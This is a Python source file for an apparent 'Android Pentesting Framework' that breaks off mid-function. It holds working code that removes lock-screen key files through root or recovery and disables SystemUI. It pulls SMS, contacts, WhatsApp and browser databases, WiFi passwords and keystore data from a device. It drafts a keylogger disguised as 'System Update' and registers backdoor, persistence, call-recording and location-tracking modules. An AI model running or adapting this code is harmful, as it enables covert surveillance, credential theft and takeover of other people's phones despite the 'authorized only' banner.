#!/usr/bin/env python3
"""
Android Pentesting Framework (APF)
Version: 2.0
Author: Security Researcher
License: For Authorized Security Testing Only

A comprehensive framework for Android device security testing,
forensics, and authorized penetration testing.

WARNING: Use only on devices you own or have explicit permission to test.
"""

import subprocess
import sys
import os
import time
import json
import threading
import queue
import socket
import struct
import select
import argparse
import shutil
import hashlib
import base64
import tempfile
import zipfile
import tarfile
from datetime import datetime
from pathlib import Path, PurePosixPath
from enum import Enum
from dataclasses import dataclass
from typing import Optional, List, Dict, Any, Tuple
import random
import string
import xml.etree.ElementTree as ET

try:
    import cv2
    import numpy as np
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# ============================================================================
# CONFIGURATION AND CONSTANTS
# ============================================================================

class Config:
    """Framework configuration"""
    VERSION = "2.0"
    AUTHOR = "Android Pentesting Framework"
    DEFAULT_ADB = "adb"
    DEFAULT_PORT = 5555
    DEFAULT_TIMEOUT = 30
    BACKUP_DIR = Path.home() / ".apf_backups"
    LOG_DIR = Path.home() / ".apf_logs"
    MODULES_DIR = Path.home() / ".apf_modules"
    COLORS = {
        'HEADER': '\033[95m',
        'BLUE': '\033[94m',
        'CYAN': '\033[96m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'RED': '\033[91m',
        'ENDC': '\033[0m',
        'BOLD': '\033[1m'
    }
    
    @classmethod
    def colorize(cls, text, color):
        """Add color to terminal text"""
        return f"{cls.COLORS.get(color, '')}{text}{cls.COLORS['ENDC']}"

class ModuleType(Enum):
    """Module categories"""
    EXPLOIT = "Exploit"
    FORENSIC = "Forensic"
    SURVEILLANCE = "Surveillance"
    POST_EXPLOIT = "Post-Exploit"
    UTILITY = "Utility"
    NETWORK = "Network"

@dataclass
class Module:
    """Module definition"""
    name: str
    description: str
    type: ModuleType
    function: callable
    requires_root: bool = False
    requires_auth: bool = True

# ============================================================================
# CORE FRAMEWORK CLASS
# ============================================================================

class AndroidPentestFramework:
    """Main framework class"""
    
    def __init__(self, adb_path: str = "adb", verbose: bool = False):
        """
        Initialize the framework
        
        Args:
            adb_path: Path to ADB binary
            verbose: Enable verbose output
        """
        self.adb = adb_path
        self.verbose = verbose
        self.device_serial = None
        self.device_info = {}
        self.connected = False
        self.root_access = False
        self.modules = {}
        self.session_log = []
        self.module_results = {}
        self.recording = False
        self.mirroring = False
        self.keylogger_running = False
        self.backdoor_installed = False
        
        # Initialize directories
        self._init_directories()
        
        # Load modules
        self._load_modules()
        
        # Session info
        self.session_id = self._generate_session_id()
        self.session_file = Config.LOG_DIR / f"session_{self.session_id}.json"
        
        print(Config.colorize(f"""
╔══════════════════════════════════════════════════════════╗
║       ANDROID PENTESTING FRAMEWORK (APF) v{Config.VERSION}       ║
║               Authorized Security Testing Only           ║
╚══════════════════════════════════════════════════════════╝
        """, "HEADER"))
    
    def _init_directories(self):
        """Create necessary directories"""
        for directory in [Config.BACKUP_DIR, Config.LOG_DIR, Config.MODULES_DIR]:
            directory.mkdir(exist_ok=True)
    
    def _generate_session_id(self) -> str:
        """Generate unique session ID"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"{timestamp}_{random_str}"
    
    def _load_modules(self):
        """Load all framework modules"""
        # Exploit Modules
        self.modules['lock_bypass'] = Module(
            name="Lock Screen Bypass",
            description="Bypass Android lock screen using various methods",
            type=ModuleType.EXPLOIT,
            function=self.lock_screen_bypass,
            requires_root=True
        )
        
        self.modules['root_exploit'] = Module(
            name="Root Exploitation",
            description="Attempt to gain root access using known exploits",
            type=ModuleType.EXPLOIT,
            function=self.root_exploitation,
            requires_root=False
        )
        
        # Forensic Modules
        self.modules['extract_files'] = Module(
            name="File Extraction",
            description="Extract files and data from device",
            type=ModuleType.FORENSIC,
            function=self.extract_files,
            requires_root=True
        )
        
        self.modules['backup_data'] = Module(
            name="Full Data Backup",
            description="Create complete device backup",
            type=ModuleType.FORENSIC,
            function=self.full_backup,
            requires_root=True
        )
        
        self.modules['analyze_packages'] = Module(
            name="Package Analysis",
            description="Analyze installed applications",
            type=ModuleType.FORENSIC,
            function=self.analyze_packages,
            requires_root=False
        )
        
        # Surveillance Modules
        self.modules['screen_mirror'] = Module(
            name="Screen Mirroring",
            description="Mirror and control device screen",
            type=ModuleType.SURVEILLANCE,
            function=self.screen_mirroring,
            requires_root=False
        )
        
        self.modules['screen_record'] = Module(
            name="Screen Recording",
            description="Record device screen to video file",
            type=ModuleType.SURVEILLANCE,
            function=self.screen_recording,
            requires_root=False
        )
        
        self.modules['take_screenshot'] = Module(
            name="Screenshot Capture",
            description="Take screenshots of device",
            type=ModuleType.SURVEILLANCE,
            function=self.take_screenshot,
            requires_root=False
        )
        
        self.modules['camera_access'] = Module(
            name="Camera Access",
            description="Access device cameras",
            type=ModuleType.SURVEILLANCE,
            function=self.camera_access,
            requires_root=True
        )
        
        self.modules['mic_recording'] = Module(
            name="Microphone Recording",
            description="Record audio from device microphone",
            type=ModuleType.SURVEILLANCE,
            function=self.mic_recording,
            requires_root=True
        )
        
        self.modules['keylogger'] = Module(
            name="Keylogger Installation",
            description="Install and manage keylogger",
            type=ModuleType.SURVEILLANCE,
            function=self.install_keylogger,
            requires_root=True
        )
        
        self.modules['sms_intercept'] = Module(
            name="SMS Interception",
            description="Intercept and read SMS messages",
            type=ModuleType.SURVEILLANCE,
            function=self.sms_interception,
            requires_root=True
        )
        
        self.modules['call_recording'] = Module(
            name="Call Recording",
            description="Record phone calls",
            type=ModuleType.SURVEILLANCE,
            function=self.call_recording,
            requires_root=True
        )
        
        self.modules['location_tracking'] = Module(
            name="Location Tracking",
            description="Track device location",
            type=ModuleType.SURVEILLANCE,
            function=self.location_tracking,
            requires_root=True
        )
        
        # Post-Exploit Modules
        self.modules['install_backdoor'] = Module(
            name="Backdoor Installation",
            description="Install persistent backdoor",
            type=ModuleType.POST_EXPLOIT,
            function=self.install_backdoor,
            requires_root=True
        )
        
        self.modules['persistence'] = Module(
            name="Persistence Mechanisms",
            description="Establish persistence on device",
            type=ModuleType.POST_EXPLOIT,
            function=self.establish_persistence,
            requires_root=True
        )
        
        self.modules['privilege_escalation'] = Module(
            name="Privilege Escalation",
            description="Escalate privileges on compromised device",
            type=ModuleType.POST_EXPLOIT,
            function=self.privilege_escalation,
            requires_root=True
        )
        
        # Network Modules
        self.modules['network_info'] = Module(
            name="Network Information",
            description="Gather network configuration and connections",
            type=ModuleType.NETWORK,
            function=self.network_information,
            requires_root=False
        )
        
        self.modules['port_scanning'] = Module(
            name="Port Scanning",
            description="Scan open ports on device",
            type=ModuleType.NETWORK,
            function=self.port_scanning,
            requires_root=True
        )
        
        self.modules['packet_capture'] = Module(
            name="Packet Capture",
            description="Capture network packets",
            type=ModuleType.NETWORK,
            function=self.packet_capture,
            requires_root=True
        )
        
        self.modules['wifi_control'] = Module(
            name="WiFi Control",
            description="Control WiFi connections",
            type=ModuleType.NETWORK,
            function=self.wifi_control,
            requires_root=True
        )
        
        # Utility Modules
        self.modules['shell_access'] = Module(
            name="Interactive Shell",
            description="Access device shell",
            type=ModuleType.UTILITY,
            function=self.interactive_shell,
            requires_root=False
        )
        
        self.modules['app_manager'] = Module(
            name="Application Manager",
            description="Install/uninstall/manage applications",
            type=ModuleType.UTILITY,
            function=self.app_manager,
            requires_root=False
        )
        
        self.modules['file_manager'] = Module(
            name="File Manager",
            description="Browse and manage device files",
            type=ModuleType.UTILITY,
            function=self.file_manager,
            requires_root=True
        )
        
        self.modules['process_manager'] = Module(
            name="Process Manager",
            description="View and manage running processes",
            type=ModuleType.UTILITY,
            function=self.process_manager,
            requires_root=True
        )
        
        self.modules['system_info'] = Module(
            name="System Information",
            description="Gather detailed system information",
            type=ModuleType.UTILITY,
            function=self.system_information,
            requires_root=False
        )
        
        self.modules['vulnerability_scan'] = Module(
            name="Vulnerability Scanner",
            description="Scan for known vulnerabilities",
            type=ModuleType.UTILITY,
            function=self.vulnerability_scanning,
            requires_root=True
        )
        
        self.modules['bruteforce_pin'] = Module(
            name="PIN Bruteforce",
            description="Bruteforce lock screen PIN",
            type=ModuleType.UTILITY,
            function=self.bruteforce_pin,
            requires_root=False
        )
        
        print(f"[+] Loaded {len(self.modules)} modules")
    
    def log(self, message: str, level: str = "INFO"):
        """Log message to session log"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        self.session_log.append(log_entry)
        
        if self.verbose or level in ["ERROR", "WARNING"]:
            color = "RED" if level == "ERROR" else "YELLOW" if level == "WARNING" else "GREEN"
            print(Config.colorize(log_entry, color))
    
    def run_command(self, command: str, device_specific: bool = True, 
                   capture_output: bool = True, timeout: int = 30) -> Optional[subprocess.CompletedProcess]:
        """
        Execute ADB command
        
        Args:
            command: Command to execute
            device_specific: Whether to use device serial
            capture_output: Capture command output
            timeout: Command timeout in seconds
            
        Returns:
            CompletedProcess object or None
        """
        cmd_parts = [self.adb]
        
        if device_specific and self.device_serial:
            cmd_parts.extend(["-s", self.device_serial])
        
        cmd_parts.extend(command.split())
        
        try:
            self.log(f"Executing: {' '.join(cmd_parts)}", "DEBUG")
            
            if capture_output:
                result = subprocess.run(
                    cmd_parts,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore'
                )
            else:
                result = subprocess.run(
                    cmd_parts,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=timeout
                )
            
            return result
            
        except subprocess.TimeoutExpired:
            self.log(f"Command timed out: {' '.join(cmd_parts)}", "ERROR")
            return None
        except FileNotFoundError:
            self.log(f"ADB not found: {self.adb}", "ERROR")
            return None
        except Exception as e:
            self.log(f"Command error: {e}", "ERROR")
            return None
    
    def check_adb(self) -> bool:
        """Check if ADB is available"""
        result = self.run_command("version", device_specific=False)
        if result and result.returncode == 0:
            self.log("ADB is available", "INFO")
            return True
        return False
    
    def list_devices(self) -> List[Tuple[str, str]]:
        """List connected devices"""
        devices = []
        result = self.run_command("devices -l", device_specific=False)
        
        if result and result.returncode == 0:
            for line in result.stdout.strip().split('\n')[1:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        serial = parts[0]
                        status = parts[1]
                        devices.append((serial, status))
        
        return devices
    
    def connect_device(self, serial: str = None) -> bool:
        """
        Connect to specific device
        
        Args:
            serial: Device serial number
            
        Returns:
            True if connected successfully
        """
        if serial:
            self.device_serial = serial
        
        if not self.device_serial:
            devices = self.list_devices()
            if not devices:
                self.log("No devices found", "ERROR")
                return False
            
            # Try to find authorized device
            authorized = [d for d in devices if d[1] == "device"]
            if authorized:
                self.device_serial = authorized[0][0]
                self.log(f"Auto-selected device: {self.device_serial}", "INFO")
            else:
                self.log("No authorized devices found", "ERROR")
                return False
        
        # Check connection
        result = self.run_command("get-state")
        if result and result.returncode == 0 and result.stdout.strip() == "device":
            self.connected = True
            self.gather_device_info()
            self.check_root()
            self.log(f"Connected to device: {self.device_serial}", "SUCCESS")
            return True
        
        self.log(f"Failed to connect to device: {self.device_serial}", "ERROR")
        return False
    
    def gather_device_info(self):
        """Gather comprehensive device information"""
        info = {}
        
        # Basic info
        commands = {
            "model": "shell getprop ro.product.model",
            "brand": "shell getprop ro.product.brand",
            "device": "shell getprop ro.product.device",
            "android_version": "shell getprop ro.build.version.release",
            "sdk_version": "shell getprop ro.build.version.sdk",
            "build_id": "shell getprop ro.build.id",
            "security_patch": "shell getprop ro.build.version.security_patch",
            "kernel": "shell uname -a",
            "serial": "shell getprop ro.serialno",
            "imei": "shell service call iphonesubinfo 1",
            "wifi_mac": "shell cat /sys/class/net/wlan0/address",
            "bt_mac": "shell bt_mac"
        }
        
        for key, cmd in commands.items():
            result = self.run_command(cmd)
            if result and result.returncode == 0:
                info[key] = result.stdout.strip()
        
        # Storage info
        result = self.run_command("shell df -h /data")
        if result and result.returncode == 0:
            info['storage'] = result.stdout.strip()
        
        # Memory info
        result = self.run_command("shell cat /proc/meminfo")
        if result and result.returncode == 0:
            info['memory'] = result.stdout.strip()
        
        # CPU info
        result = self.run_command("shell cat /proc/cpuinfo")
        if result and result.returncode == 0:
            info['cpu'] = result.stdout.strip()
        
        # Battery info
        result = self.run_command("shell dumpsys battery")
        if result and result.returncode == 0:
            info['battery'] = result.stdout.strip()
        
        self.device_info = info
        
        # Save to file
        info_file = Config.LOG_DIR / f"device_info_{self.device_serial}.json"
        with open(info_file, 'w') as f:
            json.dump(info, f, indent=2)
        
        self.log(f"Device information saved to {info_file}", "INFO")
    
    def check_root(self) -> bool:
        """Check if device has root access"""
        result = self.run_command("shell su -c 'echo root_test'")
        
        if result and result.returncode == 0 and "root_test" in result.stdout:
            self.root_access = True
            self.log("Root access available", "SUCCESS")
            return True
        
        self.root_access = False
        self.log("Root access not available", "WARNING")
        return False
    
    def wait_for_device(self, timeout: int = 120) -> bool:
        """Wait for device to be available"""
        self.log(f"Waiting for device (timeout: {timeout}s)...", "INFO")
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            result = self.run_command("get-state")
            if result and result.returncode == 0 and result.stdout.strip() == "device":
                self.log("Device is ready", "SUCCESS")
                return True
            
            time.sleep(2)
        
        self.log("Device wait timeout", "ERROR")
        return False
    
    # ============================================================================
    # MODULE IMPLEMENTATIONS
    # ============================================================================
    
    def lock_screen_bypass(self, options: dict = None) -> dict:
        """
        Lock screen bypass using multiple methods
        
        Args:
            options: Method-specific options
            
        Returns:
            Result dictionary
        """
        results = {"success": False, "method": "", "details": ""}
        
        if not self.connected:
            self.log("Device not connected", "ERROR")
            return results
        
        methods = [
            ("key_deletion", "Delete lock screen key files"),
            ("adb_disable", "Disable lock screen via ADB"),
            ("smali_patch", "Patch lock screen service"),
            ("recovery_mode", "Use recovery mode"),
            ("frida_injection", "Inject Frida script"),
            ("cve_exploit", "Use known CVE exploit")
        ]
        
        print(Config.colorize("\n[LOCK SCREEN BYPASS]", "HEADER"))
        for i, (method, desc) in enumerate(methods, 1):
            print(f"{i}. {desc}")
        
        choice = input("\nSelect method (1-6): ").strip()
        
        if choice == "1":  # Key deletion
            if not self.root_access:
                self.log("Root access required for this method", "ERROR")
                return results
            
            # Backup files first
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_dir = Config.BACKUP_DIR / f"lock_backup_{timestamp}"
            backup_dir.mkdir(exist_ok=True)
            
            # List of lock screen files
            lock_files = [
                "/data/system/*.key",
                "/data/system/locksettings.db*",
                "/data/system/gatekeeper.*",
                "/data/system/password.key",
                "/data/system/gesture.key",
                "/data/system/spblob/*"
            ]
            
            # Backup
            for pattern in lock_files:
                self.run_command(f"shell su -c 'cp {pattern} {backup_dir}/ 2>/dev/null || true'")
            
            # Delete
            for pattern in lock_files:
                self.run_command(f"shell su -c 'rm -f {pattern}'")
            
            self.log("Lock screen files removed", "SUCCESS")
            results.update({"success": True, "method": "key_deletion", "details": backup_dir})
        
        elif choice == "2":  # ADB disable
            self.run_command("shell pm disable com.android.systemui")
            self.run_command("shell am start -a android.settings.SETTINGS")
            self.log("SystemUI disabled, settings launched", "SUCCESS")
            results.update({"success": True, "method": "adb_disable"})
        
        elif choice == "3":  # Smali patch
            self.log("Smali patching not implemented", "WARNING")
            # This would require decompiling services.jar, patching, and recompiling
        
        elif choice == "4":  # Recovery mode
            self.reboot_device("recovery")
            time.sleep(10)
            
            if self.wait_for_device(30):
                # Mount data partition
                self.run_command("shell mount /data")
                
                # Remove lock files
                self.run_command("shell rm -f /data/system/*.key")
                self.run_command("shell rm -f /data/system/locksettings.db*")
                
                self.log("Lock files removed from recovery", "SUCCESS")
                results.update({"success": True, "method": "recovery_mode"})
            
            self.reboot_device()
        
        return results
    
    def screen_mirroring(self, options: dict = None) -> dict:
        """
        Mirror and control device screen
        
        Args:
            options: Mirroring options
            
        Returns:
            Result dictionary
        """
        results = {"success": False, "port": 0}
        
        if not OPENCV_AVAILABLE:
            self.log("OpenCV required for screen mirroring", "ERROR")
            return results
        
        try:
            # Start scrcpy if available
            scrcpy_path = shutil.which("scrcpy")
            if scrcpy_path:
                port = options.get('port', 8888)
                
                # Start scrcpy server on device
                self.run_command(f"forward tcp:{port} localabstract:scrcpy")
                
                # Start scrcpy client
                import threading
                def run_scrcpy():
                    subprocess.run([scrcpy_path, "--tcpip", f"127.0.0.1:{port}"])
                
                thread = threading.Thread(target=run_scrcpy)
                thread.daemon = True
                thread.start()
                
                self.mirroring = True
                self.log(f"Screen mirroring started on port {port}", "SUCCESS")
                results.update({"success": True, "port": port})
                
                input("Press Enter to stop mirroring...")
                self.mirroring = False
                
            else:
                # Fallback: Use minicap for screen capture
                self.log("scrcpy not found, using alternative method", "WARNING")
                
                # Try to use minicap (requires pushing binary)
                minicap_path = Path("tools/minicap")
                if minicap_path.exists():
                    self.run_command(f"push {minicap_path} /data/local/tmp/")
                    self.run_command("shell chmod 755 /data/local/tmp/minicap")
                    
                    # Get screen resolution
                    result = self.run_command("shell wm size")
                    if result:
                        resolution = result.stdout.strip().split()[-1]
                        
                        # Start minicap
                        self.run_command(
                            f"shell /data/local/tmp/minicap -P {resolution}@{resolution}/0"
                        )
                
                results.update({"success": False, "error": "scrcpy not found"})
                
        except Exception as e:
            self.log(f"Screen mirroring error: {e}", "ERROR")
        
        return results
    
    def screen_recording(self, options: dict = None) -> dict:
        """
        Record device screen
        
        Args:
            options: Recording options
            
        Returns:
            Result dictionary
        """
        results = {"success": False, "file": ""}
        
        duration = options.get('duration', 30)
        output = options.get('output', f"screen_record_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4")
        
        try:
            # Use screenrecord command
            device_path = f"/sdcard/{output}"
            self.run_command(f"shell screenrecord --verbose --time-limit {duration} {device_path}")
            
            # Wait for recording to complete
            time.sleep(duration + 2)
            
            # Pull recording
            local_path = Config.BACKUP_DIR / output
            self.run_command(f"pull {device_path} {local_path}")
            
            # Clean up
            self.run_command(f"shell rm {device_path}")
            
            self.recording = False
            self.log(f"Screen recording saved to {local_path}", "SUCCESS")
            results.update({"success": True, "file": str(local_path)})
            
        except Exception as e:
            self.log(f"Screen recording error: {e}", "ERROR")
        
        return results
    
    def take_screenshot(self, options: dict = None) -> dict:
        """
        Take screenshot of device
        
        Args:
            options: Screenshot options
            
        Returns:
            Result dictionary
        """
        results = {"success": False, "file": ""}
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            device_path = f"/sdcard/screenshot_{timestamp}.png"
            local_path = Config.BACKUP_DIR / f"screenshot_{timestamp}.png"
            
            # Take screenshot
            self.run_command(f"shell screencap -p {device_path}")
            
            # Pull to computer
            self.run_command(f"pull {device_path} {local_path}")
            
            # Clean up
            self.run_command(f"shell rm {device_path}")
            
            self.log(f"Screenshot saved to {local_path}", "SUCCESS")
            results.update({"success": True, "file": str(local_path)})
            
        except Exception as e:
            self.log(f"Screenshot error: {e}", "ERROR")
        
        return results
    
    def wifi_control(self, options: dict = None) -> dict:
        """
        Control WiFi connections
        
        Args:
            options: Control options
            
        Returns:
            Result dictionary
        """
        results = {"success": False}
        
        if not self.root_access:
            self.log("Root access required for WiFi control", "ERROR")
            return results
        
        actions = [
            ("status", "Check WiFi status"),
            ("enable", "Enable WiFi"),
            ("disable", "Disable WiFi"),
            ("scan", "Scan for networks"),
            ("connect", "Connect to network"),
            ("forget", "Forget network"),
            ("info", "Get connection info")
        ]
        
        print(Config.colorize("\n[WiFi CONTROL]", "HEADER"))
        for i, (action, desc) in enumerate(actions, 1):
            print(f"{i}. {desc}")
        
        choice = input("\nSelect action (1-7): ").strip()
        
        if choice == "1":  # Status
            result = self.run_command("shell dumpsys wifi")
            if result:
                print(result.stdout)
                results.update({"success": True, "output": result.stdout})
        
        elif choice == "2":  # Enable
            self.run_command("shell svc wifi enable")
            self.log("WiFi enabled", "SUCCESS")
            results.update({"success": True})
        
        elif choice == "3":  # Disable
            self.run_command("shell svc wifi disable")
            self.log("WiFi disabled", "SUCCESS")
            results.update({"success": True})
        
        elif choice == "4":  # Scan
            self.run_command("shell cmd wifi start-scan")
            time.sleep(3)
            result = self.run_command("shell cmd wifi list-scan-results")
            if result:
                print(result.stdout)
                results.update({"success": True, "networks": result.stdout})
        
        elif choice == "5":  # Connect
            ssid = input("SSID: ")
            password = input("Password: ")
            
            # Create wpa_supplicant configuration
            config = f'network={{\n  ssid="{ssid}"\n  psk="{password}"\n}}\n'
            
            # Push config (requires root)
            self.run_command(f"shell 'echo \"{config}\" > /data/misc/wifi/wpa_supplicant.conf'")
            self.run_command("shell svc wifi restart")
            
            self.log(f"Attempting to connect to {ssid}", "INFO")
            results.update({"success": True})
        
        return results
    
    def interactive_shell(self, options: dict = None) -> dict:
        """
        Interactive device shell
        
        Args:
            options: Shell options
            
        Returns:
            Result dictionary
        """
        results = {"success": False}
        
        print(Config.colorize("\n[INTERACTIVE SHELL]", "HEADER"))
        print("Type 'exit' or 'quit' to return to menu")
        print("Type 'su' for root shell (if available)")
        print("-" * 50)
        
        try:
            while True:
                # Get command
                cmd = input(f"android@{self.device_serial}$ ").strip()
                
                if cmd.lower() in ['exit', 'quit', 'q']:
                    break
                
                if cmd == "su" and self.root_access:
                    print("Switching to root shell...")
                    cmd = "su -c"
                    while True:
                        root_cmd = input(f"root@{self.device_serial}# ").strip()
                        if root_cmd.lower() in ['exit', 'quit']:
                            break
                        if root_cmd:
                            result = self.run_command(f"shell su -c '{root_cmd}'", capture_output=True)
                            if result:
                                print(result.stdout)
                                if result.stderr:
                                    print(result.stderr, file=sys.stderr)
                    continue
                
                # Execute command
                if cmd:
                    result = self.run_command(f"shell {cmd}", capture_output=True)
                    if result:
                        print(result.stdout)
                        if result.stderr:
                            print(result.stderr, file=sys.stderr)
        
        except KeyboardInterrupt:
            print("\nShell interrupted")
        
        results.update({"success": True})
        return results
    
    def install_keylogger(self, options: dict = None) -> dict:
        """
        Install and manage keylogger
        
        Args:
            options: Keylogger options
            
        Returns:
            Result dictionary
        """
        results = {"success": False, "installed": False}
        
        if not self.root_access:
            self.log("Root access required for keylogger", "ERROR")
            return results
        
        actions = [
            ("install", "Install keylogger"),
            ("start", "Start keylogger"),
            ("stop", "Stop keylogger"),
            ("retrieve", "Retrieve logs"),
            ("uninstall", "Uninstall keylogger")
        ]
        
        print(Config.colorize("\n[KEYLOGGER]", "HEADER"))
        for i, (action, desc) in enumerate(actions, 1):
            print(f"{i}. {desc}")
        
        choice = input("\nSelect action (1-5): ").strip()
        
        if choice == "1":  # Install
            # Create keylogger APK
            self.log("Building keylogger APK...", "INFO")
            
            keylogger_apk = self.build_keylogger_apk()
            if keylogger_apk:
                # Install APK
                self.run_command(f"install -r {keylogger_apk}")
                self.log("Keylogger installed", "SUCCESS")
                self.keylogger_running = True
                results.update({"success": True, "installed": True})
        
        elif choice == "2":  # Start
            # Start keylogger service
            self.run_command("shell am startservice com.keylogger/.KeyloggerService")
            self.keylogger_running = True
            self.log("Keylogger started", "SUCCESS")
            results.update({"success": True})
        
        elif choice == "3":  # Stop
            self.run_command("shell am stopservice com.keylogger/.KeyloggerService")
            self.keylogger_running = False
            self.log("Keylogger stopped", "SUCCESS")
            results.update({"success": True})
        
        elif choice == "4":  # Retrieve logs
            # Pull log file
            local_path = Config.BACKUP_DIR / f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            self.run_command(f"pull /sdcard/keylog.txt {local_path}")
            
            if local_path.exists():
                with open(local_path, 'r') as f:
                    logs = f.read()
                    print(f"\nKeylogs:\n{logs}")
                
                self.log(f"Logs retrieved: {local_path}", "SUCCESS")
                results.update({"success": True, "logs": str(local_path)})
        
        elif choice == "5":  # Uninstall
            self.run_command("uninstall com.keylogger")
            self.keylogger_running = False
            self.log("Keylogger uninstalled", "SUCCESS")
            results.update({"success": True})
        
        return results
    
    def build_keylogger_apk(self) -> Optional[Path]:
        """Build keylogger APK"""
        try:
            # Create temp directory
            temp_dir = Path(tempfile.mkdtemp())
            
            # Basic AndroidManifest.xml
            manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.keylogger">
    
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.ACCESSIBILITY_SERVICE" />
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Update">
        
        <service
            android:name=".KeyloggerService"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>
        
    </application>
</manifest>'''
            
            # Save manifest
            (temp_dir / "AndroidManifest.xml").write_text(manifest)
            
            # TODO: Add Java source code, resources, etc.
            # This is a simplified version
            
            # For now, return a placeholder
            return None
            
        except Exception as e:
            self.log(f"APK build error: {e}", "ERROR")
            return None
    
    def extract_files(self, options: dict = None) -> dict:
        """
        Extract files from device
        
        Args:
            options: Extraction options
            
        Returns:
            Result dictionary
        """
        results = {"success": False, "extracted": []}
        
        if not self.root_access:
            self.log("Root access required for file extraction", "ERROR")
            return results
        
        targets = [
            ("sms", "/data/data/com.android.providers.telephony/databases/mmssms.db"),
            ("contacts", "/data/data/com.android.providers.contacts/databases/contacts2.db"),
            ("call_logs", "/data/data/com.android.providers.contacts/databases/calllog.db"),
            ("whatsapp", "/data/data/com.whatsapp/databases/msgstore.db"),
            ("facebook", "/data/data/com.facebook.katana/databases/fb.db"),
            ("chrome_history", "/data/data/com.android.chrome/app_chrome/Default/History"),
            ("wifi_passwords", "/data/misc/wifi/wpa_supplicant.conf"),
            ("clipboard", "/data/system/clipboard/clipboard"),
            ("keychain", "/data/misc/keystore/user_0/"),
            ("camera_photos", "/sdcard/DCIM/Camera/"),
            ("downloads", "/sdcard/Download/"),
            ("documents", "/sdcard/Documents/")
        ]
        
        print(Config.colorize("\n[FILE EXTRACTION]", "HEADER"))
        for i, (name, path) in enumerate(targets, 1):
            print(f"{i}. {name:<20} {path}")
        
        print(f"{len(targets)+1}. Custom path")
        print(f"{len(targets)+2}. Extract all")
        
        choice = input(f"\nSelect target (1-{len(targets)+2}): ").strip()
        
        extract_dir = Config.BACKUP_DIR / f"extraction_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        extract_dir.mkdir(exist_ok=True)
        
        try:
            if choice == str(len(targets) + 2):  # Extract all
                for name, path in targets:
                    self._extract_single_file(path, extract_dir / name)
                    results["extracted"].append((name, path))
            
            elif choice == str(len(targets) + 1):  # Custom path
                custom_path = input("Enter device path: ").strip()
                if custom_path:
                    self._extract_single_file(custom_path, extract_dir / "custom")
                    results["extracted"].append(("custom", custom_path))
            
            else:  # Single target
                idx = int(choice) - 1
                if 0 <= idx < len(targets):
                    name, path = targets[idx]
                    self._extract_single_file(path, extract_dir / name)
                    results["extracted"].append((name, path))
            
            results["success"] = True
            results["directory"] = str(extract_dir)
            self.log(f"Files extracted to {extract_dir}", "SUCCESS")
            
        except Exception as e:
            self.log(f"Extraction error: {e}", "ERROR")
        
        return results
    
    def _extract_single_file(self, remote_path: str, local_path: Path):
        """Extract single file or directory"""
        # Check if it exists
        result = self.run_command(f"shell ls {remote_path}")
        if not result or result.returncode != 0:
            self.log(f"Path not found: {remote_path}", "WARNING")
            return
        
        # If it's a directory
        result = self.run_command(f"shell ls -d {remote_path}")
        if result and result.returncode == 0:
            # Create local directory
            local_path.mkdir(exist_ok=True)
            
            # Pull recursively
            self.run_command(f"pull {remote_path} {local_path}")
        else:
            # Single file
            self.run_command(f"pull {remote_path} {local_path}")
    
    def app_manager(self, options: dict = None) -> dict:
        """
        Application management
        
        Args:
            options: App manager options
            
        Returns:
            Result dictionary
        """
        results = {"success": False}
        
        actions = [
            ("list", "List installed apps"),
            ("install", "Install APK"),
            ("uninstall", "Uninstall app"),
            ("extract", "Extract APK"),
            ("info", "Get app info"),
            ("permissions", "List app permissions"),
            ("activities", "List activities"),
            ("services", "List services"),
            ("receivers", "List broadcast receivers")
        ]
        
        print(Config.colorize("\n[APP MANAGER]", "HEADER"))
        for i, (action, desc) in enumerate(actions, 1):
            print(f"{i}. {desc}")
        
        choice = input("\nSelect action (1-9): ").strip()
        
        if choice == "1":  # List apps
            result = self.run_command("shell pm list packages -f")
            if result:
                apps = []
                for line in result.stdout.strip().split('\n'):
                    if line.startswith("package:"):
                        parts = line.split('=')
                        if len(parts) == 2:
                            path, package = parts
                            path = path.replace("package:", "")
                            apps.append((package, path))
                
                for i, (package, path) in enumerate(apps[:50], 1):  # Show first 50
                    print(f"{i:3}. {package:<40} {path}")
                
                if len(apps) > 50:
                    print(f"... and {len(apps)-50} more")
                
                results.update({"success": True, "apps": apps})
        
        elif choice == "2":  # Install
            apk_path = input("APK path: ").strip()
            if os.path.exists(apk_path):
                self.run_command(f"install {apk_path}")
                self.log(f"Installed {apk_path}", "SUCCESS")
                results.update({"success": True})
            else:
                self.log(f"File not found: {apk_path}", "ERROR")
        
        elif choice == "3":  # Uninstall
            package = input("Package name: ").strip()
            self.run_command(f"uninstall {package}")
            self.log(f"Uninstalled {package}", "SUCCESS")
            results.update({"success": True})
        
        elif choice == "4":  # Extract
            package = input("Package name: ").strip()
            
            # Get APK path
            result = self.run_command(f"shell pm path {package}")
            if result:
                apk_path = result.stdout.strip().replace("package:", "")
                
